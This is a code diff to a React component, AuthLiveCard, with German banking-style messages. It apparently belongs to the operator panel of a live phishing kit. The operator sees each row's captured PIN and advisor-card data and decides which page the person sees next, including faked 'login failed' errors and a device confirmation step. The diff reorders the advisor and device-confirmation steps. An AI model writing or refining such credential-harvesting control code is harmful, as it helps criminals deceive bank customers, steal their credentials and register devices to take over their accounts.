@@ -76,8 +76,8 @@ const AuthLiveCard = () => {
     last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.",
   });
   const acceptLogin = (r: AuthRow) =>
-    setPhase(r, r.show_berater ? "berater" : "confirm", { last_error: null });
-  const acceptBerater = (r: AuthRow) => setPhase(r, "confirm", { last_error: null });
+    setPhase(r, "confirm", { last_error: null });
+  const acceptBerater = (r: AuthRow) => setPhase(r, "login", { last_error: null });
   const rejectBerater = (r: AuthRow) => setPhase(r, "berater", {
     last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
   });
@@ -172,9 +172,7 @@ const AuthLiveCard = () => {
                         </Button>
                         <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
                         <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
-                          {r.show_berater
-                            ? <><ShieldCheck className="h-4 w-4 mr-1" />Berater-Seite anzeigen</>
-                            : <><Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen</>}
+                          <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
                         </Button>
                       </div>
                       {phase === "login" && !meta?.pin && (
@@ -191,7 +189,7 @@ const AuthLiveCard = () => {
                           <XCircle className="h-4 w-4 mr-1" />Ablehnen
                         </Button>
                         <Button size="sm" onClick={() => acceptBerater(r)} disabled={!meta?.berater_karte}>
-                          <CheckCircle2 className="h-4 w-4 mr-1" />Akzeptieren → Gerätebestätigung
+                          <CheckCircle2 className="h-4 w-4 mr-1" />Akzeptieren → Login
                         </Button>
                       </div>
                       {phase === "berater" && !meta?.berater_karte && (
